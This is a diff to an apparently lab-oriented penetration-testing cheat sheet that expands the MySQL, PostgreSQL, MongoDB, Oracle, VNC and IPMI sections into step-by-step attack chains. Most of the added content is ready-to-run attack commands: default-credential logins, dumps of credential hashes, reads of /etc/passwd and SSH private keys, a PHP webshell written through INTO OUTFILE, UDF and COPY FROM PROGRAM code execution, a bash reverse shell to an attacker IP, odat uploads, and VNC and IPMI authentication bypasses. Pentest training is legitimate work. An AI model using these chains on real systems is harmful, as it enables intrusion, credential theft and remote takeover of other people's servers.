@@ -839,25 +839,105 @@ EXEC ('SELECT @@version; EXEC xp_cmdshell ''whoami''') AT [LINKED\SERVER];   -- 
 
 **Leads to:** RCE as the SQL service account → often **SeImpersonate → SYSTEM** (`[WINDOWS-TOKENS]`); hash capture → crack/relay; linked servers → lateral.
 
-## [ENUM-MYSQL]  Port 3306 — MySQL  → `[SQLI-MYSQL]`
-```bash
-mysql -h $IP -u root -p                # try passwords: blank, 'root', 'toor'
-nmap -p3306 --script mysql-empty-password,mysql-info $IP   # check for a blank root password
-#   once inside:  show databases;  use <db>;  show tables;  select * from users;   → app creds/hashes
-#   if the account has FILE privilege:
-#     SELECT LOAD_FILE('/etc/passwd');                              # read a file off the server
-#     SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/sh.php';   # write a webshell
-```
-**Where it leads:** application creds/hashes (→ spray) and file read/write (→ webshell). UDF RCE if the plugin dir is writable `[LOOK-UP]`.
+## [ENUM-MYSQL]  Port 3306 — MySQL / MariaDB — FULL CHAIN  → `[SQLI-MYSQL]`
+**What it is:** a database. Win paths: **dump app creds/hashes** (→ reuse), and with the **FILE privilege** → **read/write files** (webshell / read SSH keys). UDF → RCE if the plugin dir is writable.
 
-## [ENUM-POSTGRES]  Port 5432 — PostgreSQL  → `[SQLI-POSTGRES]`
-```bash
-psql -h $IP -U postgres      # try password: 'postgres' or blank
-nxc postgres $IP -u $U -p $P # test creds
-#   command execution (superuser, v9.3+):  COPY t FROM PROGRAM 'id';
-#   read a file:                           COPY t FROM '/etc/passwd';    [LOOK-UP]
+### 🗺️ Decision tree
 ```
-**Where it leads:** command execution as the postgres user, file read.
+log in? (root/blank, root/root, found creds, SQLi from web) →
+   dump DBs → app users/hashes → crack/reuse everywhere
+   has FILE priv? → read files (/etc/passwd, configs, id_rsa) ; write webshell (if web root writable)
+   plugin dir writable + superuser? → UDF RCE
+no login → version exploit? default creds? SQLi via a web app?
+```
+
+### Step 1 — Log in
+```bash
+nmap -p3306 --script "mysql-info,mysql-empty-password,mysql-users,mysql-databases" $IP
+mysql -h $IP -u root                      # blank root (very common on labs)
+mysql -h $IP -u root -p                    # try: root, toor, password, '' 
+mysql -h $IP -u $U -p'$P'                   # found creds
+nxc mysql $IP -u $U -p $P                   # validate via nxc
+```
+
+### Step 2 — Loot the data
+```sql
+SHOW DATABASES; USE <db>; SHOW TABLES; SELECT * FROM users;     -- app creds/hashes → crack (hashcat) / reuse
+SELECT user,authentication_string FROM mysql.user;             -- DB account hashes (-m 300 mysql-sha1 etc.)
+SELECT version(); SELECT current_user(); SELECT @@secure_file_priv;   -- version + where OUTFILE may write
+```
+
+### Step 3 — FILE privilege → read/write files
+```sql
+SELECT LOAD_FILE('/etc/passwd');                               -- read any file (if FILE priv + secure_file_priv allows)
+SELECT LOAD_FILE('/home/<user>/.ssh/id_rsa');                  -- steal a key
+SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/sh.php';   -- webshell (web root must be writable)
+-- then: curl "http://$IP/sh.php?c=id"
+```
+- `@@secure_file_priv` = `''` (empty) → OUTFILE works anywhere; a path → only there; `NULL` → disabled.
+
+### Step 4 — UDF RCE (superuser + writable plugin dir)
+```sql
+SELECT @@plugin_dir;                                           -- where UDF .so must go
+-- use raptor_udf2 / sqlmap's lib_mysqludf_sys to get sys_exec('id')   [LOOK-UP]
+```
+
+### 🧯 Troubleshooting
+| Symptom | Fix |
+|---|---|
+| `Access denied for user 'root'@...` | wrong pass → try blank, common; or it only allows localhost → need a shell first |
+| `Host ... is not allowed to connect` | remote login disabled → reach it from a foothold / via tunnel |
+| `INTO OUTFILE` → "secure-file-priv" | `@@secure_file_priv` restricts writes → read-only (LOAD_FILE) or write only to its path |
+| no FILE priv | just dump data (Step 2) and reuse creds |
+
+**Leads to:** app creds → spray `[CREDENTIALS-QUICK]`; file read → keys/creds; webshell/UDF → `[WEB-UPLOAD]` / shell.
+
+## [ENUM-POSTGRES]  Port 5432 — PostgreSQL — FULL CHAIN  → `[SQLI-POSTGRES]`
+**What it is:** a database. The prize: **`COPY ... FROM PROGRAM`** = direct **RCE** as the postgres user (superuser, v9.3+). Also file read, and app-cred loot.
+
+### 🗺️ Decision tree
+```
+log in? (postgres/blank, postgres/postgres, found creds) →
+   are you superuser? → COPY FROM PROGRAM → RCE (reverse shell as postgres)
+   not superuser → dump app DBs → creds/hashes → reuse ; read files if allowed
+no login → default creds? version exploit? SQLi from a web app?
+```
+
+### Step 1 — Log in
+```bash
+nmap -p5432 -sCV $IP
+psql -h $IP -U postgres                    # try blank, then 'postgres'
+psql "postgresql://$U:$P@$IP:5432/postgres"
+nxc postgres $IP -u $U -p $P                # validate
+```
+
+### Step 2 — RCE (superuser) via COPY FROM PROGRAM
+```sql
+-- check:  SELECT current_setting('is_superuser');
+DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'id';                 -- runs OS command as the postgres user
+SELECT * FROM cmd_exec;                          -- read the output
+-- reverse shell:
+COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<KALI-IP>/443 0>&1"';   -- nc -lvnp 443 first
+```
+
+### Step 3 — Loot / file read
+```sql
+\l                                               -- list databases
+\c <db>  ; \dt  ; SELECT * FROM users;           -- dump app creds/hashes
+CREATE TABLE t(x text); COPY t FROM '/etc/passwd'; SELECT * FROM t;   -- read a file
+SELECT usename, passwd FROM pg_shadow;           -- DB account hashes (md5/scram)
+```
+
+### 🧯 Troubleshooting
+| Symptom | Fix |
+|---|---|
+| `password authentication failed` | try blank, `postgres`, found creds |
+| `COPY ... must be superuser` | not superuser → dump data / read-only; escalate via creds |
+| `FATAL: no pg_hba.conf entry` | remote login blocked → reach it from a foothold/tunnel |
+| COPY FROM PROGRAM "not supported" | pre-9.3 → use other vectors (data loot, file read) |
+
+**Leads to:** RCE as postgres → `[LINUX-PRIVESC]`; creds → spray `[CREDENTIALS-QUICK]`.
 
 ## [ENUM-REDIS]  Port 6379 — Redis (in-memory key-value store) — FULL CHAIN
 **What it is:** a fast in-memory key-value DB, **very often exposed with NO authentication.** If you can talk to it you can usually read its data AND write files to disk (→ webshell / SSH key / cron), or **load a module → direct RCE** (Redis ≥ 4.0).
@@ -998,12 +1078,43 @@ redis-cli -h $IP -a '<password>'            # once you have one (ignore the "ins
 
 **Leads to:** foothold (RCE / SSH login) → `[LINUX-PRIVESC]`; looted creds → spray `[CREDENTIALS-QUICK]`.
 
-## [ENUM-MONGODB]  Port 27017 — MongoDB
-```bash
-mongosh --host $IP        # or the older:  mongo $IP
-#   show dbs ;  use <db> ;  show collections ;  db.users.find()    → dump app users/hashes/tokens (often no auth)
+## [ENUM-MONGODB]  Port 27017 — MongoDB — FULL CHAIN
+**What it is:** a NoSQL database, **very often with NO authentication.** Main win: **dump collections** → app users/hashes/tokens/API keys → reuse. (No `xp_cmdshell`-style RCE; it's a data-loot service.)
+
+### 🗺️ Decision tree
 ```
-**Where it leads:** creds/tokens for the application.
+connect (no auth first) → list DBs/collections → dump everything → mine for:
+   ├─ password hashes → crack (hashcat) → reuse
+   ├─ plaintext creds / API keys / tokens → use directly on web/SSH/etc.
+   └─ app logic (admin flags, reset tokens) → IDOR/auth-bypass on the web app
+needs auth? → find creds (app config/.env/source) → connect with -u/-p
+```
+
+### Steps
+```bash
+nmap -p27017 -sCV --script "mongodb-info,mongodb-databases" $IP
+mongosh --host $IP                      # or older:  mongo $IP   (no creds = unauth ✅)
+mongosh "mongodb://$U:$P@$IP:27017"     # with creds
+```
+Inside the shell:
+```javascript
+show dbs                                 // list databases
+use <db> ; show collections              // list collections
+db.<collection>.find().pretty()          // dump a collection (users, sessions, config)
+db.getSiblingDB('<db>').<coll>.find()     
+// dump EVERYTHING fast:
+db.adminCommand('listDatabases').databases.forEach(d => print(d.name))
+```
+Mine for `password`, `hash`, `token`, `apikey`, `secret` → crack/reuse → `[CREDENTIALS-QUICK]`.
+
+### 🧯 Troubleshooting
+| Symptom | Fix |
+|---|---|
+| `command listDatabases requires authentication` | needs creds → find them in app config/.env/source |
+| `mongosh` not installed | use legacy `mongo $IP`, or `apt install mongodb-mongosh` |
+| connection refused remotely | bound to localhost → reach it from a foothold/tunnel |
+
+**Leads to:** app creds/tokens → reuse/spray `[CREDENTIALS-QUICK]`; data → web auth-bypass.
 
 ## [ENUM-GIT]  an exposed `.git` folder over HTTP  → `[FOUND-GIT]`
 **What it is:** source code + its full history. Repos often contain **hard-coded passwords, API keys, and endpoints** — sometimes in files that were "deleted" but still live in history.
@@ -1022,8 +1133,16 @@ docker -H tcp://$IP:2375 run -v /:/host -it alpine chroot /host sh   # if yes �
 ```
 **Where it leads:** taking over the host from a container (see `[LINUX-PRIVESC]`, Docker/LXD).
 
-## [ENUM-ORACLE]  Port 1521 — Oracle Database (TNS)
-**What it is:** an Oracle database. It's fiddly and has its own tools. The way in is usually: find a valid **SID** (the database's name), then log in with **default creds** (`scott/tiger`, `system/manager`, `sys/change_on_install`), then get command execution.
+## [ENUM-ORACLE]  Port 1521 — Oracle Database (TNS) — FULL CHAIN
+**What it is:** an Oracle database with its own tooling. Path: find a valid **SID** (database name) → log in with **default creds** → read/write files or command exec.
+### 🗺️ Decision tree
+```
+1521 open → guess the SID (odat sidguesser / nmap oracle-sid-brute) →
+   got SID → guess default creds (scott/tiger, system/manager, sys/change_on_install) →
+      creds work → odat: utlfile (write file→RCE) / externaltable (run command) / read files
+      no creds   → brute with odat passwordguesser
+   no SID → tnscmd10g version ; brute harder
+```
 ```bash
 sudo apt install oracle-instantclient  # if sqlplus/odat aren't installed
 nmap -p1521 -sV --script "oracle-tns-version,oracle-sid-brute" $IP   # version + guess the SID
@@ -1032,11 +1151,27 @@ odat passwordguesser -s $IP -p 1521 -d <SID>       # guess default username/pass
 tnscmd10g version -h $IP                            # query the TNS listener directly
 sqlplus <user>/<pass>@$IP:1521/<SID>               # log in once you have creds
 odat utlfile -s $IP -d <SID> -U <user> -P <pass> --putFile C:\\ shell.exe local.exe   # upload a file (→ RCE)
+odat externaltable -s $IP -d <SID> -U <user> -P <pass> --exec C:\\ "whoami"           # run an OS command
+odat all -s $IP -d <SID> -U <user> -P <pass>                                           # try every attack at once
 ```
-**Where it leads:** with creds → file read/write and command execution as the Oracle service account (often high-priv on Windows → SeImpersonate → SYSTEM). Default creds are the usual foothold.
+### 🧯 Troubleshooting
+| Symptom | Fix |
+|---|---|
+| `ORA-12505` listener refused | wrong/unknown SID → brute it (`odat sidguesser`) |
+| `ORA-01017` invalid username/password | wrong creds → `odat passwordguesser` |
+| sqlplus/odat missing | `sudo apt install odat` / oracle-instantclient |
+| TNS poisoning / version only | `tnscmd10g version -h $IP` to fingerprint |
+**Where it leads:** with creds → file read/write + command exec as the Oracle service account (often high-priv on Windows → **SeImpersonate → SYSTEM**). Default creds are the usual foothold.
 
-## [ENUM-VNC]  Port 5900(+) — VNC (remote desktop)
-**What it is:** a graphical remote-desktop service (like RDP, cross-platform). Some versions have an auth-bypass; weak/blank passwords are common; a found password often unlocks a desktop already logged in as a privileged user.
+## [ENUM-VNC]  Port 5900(+) — VNC (remote desktop) — FULL CHAIN
+**What it is:** cross-platform graphical remote desktop. Weak/blank passwords are common; some versions have an **auth bypass**; a found `.vnc` password file can be **decrypted**; the session is often an already-logged-in (sometimes admin) desktop.
+### 🗺️ Decision tree
+```
+5900+ open → auth-bypass vuln (realvnc CVE-2006-2369)? → connect free
+   found a *.vnc / passwd file (on another box/share)? → decrypt it (vncpwd) → connect
+   blank/weak pw? → vncviewer / brute (hydra) → connect
+   → land on a desktop (often privileged) → read screen / open a terminal
+```
 ```bash
 nmap -p5900 --script "vnc-info,realvnc-auth-bypass,vnc-title" $IP   # info + CVE-2006-2369 auth bypass check
 vncviewer $IP                                       # connect (prompts for the VNC password)
@@ -1044,7 +1179,13 @@ vncviewer $IP -passwd /path/to/vnc.passwd           # use a captured .vnc passwo
 # crack a captured VNC password file:  vncpwd vnc.passwd   (or the 'vncdec' tools)
 hydra -P rockyou.txt vnc://$IP                       # brute the password (last resort)
 ```
-**Where it leads:** a graphical session (often as an already-logged-in, sometimes admin, user).
+### 🧯 Troubleshooting
+| Symptom | Fix |
+|---|---|
+| "Authentication failure" | wrong pw → crack a looted `.vnc` file (`vncpwd`) or brute |
+| black/grey screen | server busy / wrong resolution → retry, or `vncviewer -FullColor` |
+| ports 5901/5902 instead | display :1/:2 → VNC port = 5900 + display number |
+**Where it leads:** a graphical session (often an already-logged-in, sometimes admin, user) → open a terminal → `[LINUX-PRIVESC]` / `[WINDOWS-PRIVESC]`.
 
 ## [ENUM-IPMI]  Port 623/UDP — IPMI (server management)
 **What it is:** a "lights-out" management interface on server hardware. Its big weakness: **IPMI 2.0 will hand you a password hash for any valid user before you even authenticate** (CVE-2013-4786) → crack it offline.
@@ -1053,9 +1194,15 @@ nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero $IP     # detect + check f
 # dump password hashes (Metasploit — your ONE MSF box, or just to grab the hash):
 #   use auxiliary/scanner/ipmi/ipmi_dumphashes    → gives a hashcat -m 7300 (RAKP) hash
 hashcat -m 7300 ipmi.hash rockyou.txt                # crack the captured RAKP hash
-# default creds to try: ADMIN/ADMIN, root/calvin (Dell), admin/admin
+# default creds to try: ADMIN/ADMIN, root/calvin (Dell), admin/admin, root/root
 ```
-**Where it leads:** admin creds for the server's management controller (→ often the OS).
+### 🧯 Troubleshooting
+| Symptom | Fix |
+|---|---|
+| nmap shows nothing on 623 | it's **UDP** → `nmap -sU -p623` |
+| cipher-zero works | `ipmitool -I lanplus -C 0 -H $IP -U Administrator -P '' user list` → auth-bypass (set a password / dump users) |
+| RAKP hash won't crack | strong pw → try default creds instead; or this box isn't the IPMI path |
+**Where it leads:** admin creds for the management controller → often creds reused for the OS → `[CREDENTIALS-QUICK]`.
 
 ## [ENUM-SALTSTACK]  Ports 4505/4506 — SaltStack (salt-master)
 **What it is:** SaltStack is a config-management tool. Its **salt-master** talks to agents over **ZeroMQ** on **4505** (publish) + **4506** (request). Seeing **both** open — nmap labels them `zmtp` / `ZeroMQ ZMTP` — is the dead giveaway. A **salt-api** often runs too (commonly `:8000`, returns JSON). **The salt-master runs as ROOT**, so exploiting it = **instant root, no privesc.**
